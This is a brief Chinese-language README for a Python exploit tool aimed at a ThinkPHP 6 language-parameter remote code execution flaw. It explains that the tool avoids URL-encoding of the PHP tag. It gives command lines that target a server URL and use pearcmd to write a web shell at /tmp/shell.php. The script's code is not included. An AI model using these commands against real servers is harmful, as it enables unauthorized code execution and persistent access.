# thinkphp_Lang_exp
thinkphp6 Lang RCE exp


### 说明

解决GET请求时 特殊字符自动编码问题，造成找不到有效　<?php 标记 ，文件将无法解析。

如：< >编码 %3c%3e 



### 使用方法：

python3 thinkphp_Lang_exp.py -u http://xxxx/index.php
或
python3 thinkphp_Lang_exp.py -u http://xxxx/index.php -m ../../pearcmd_path -p /tmp/shell.php



### 分析文章：

https://mp.weixin.qq.com/s/GWZ_X_jFdrq5TQW2otSL5Q
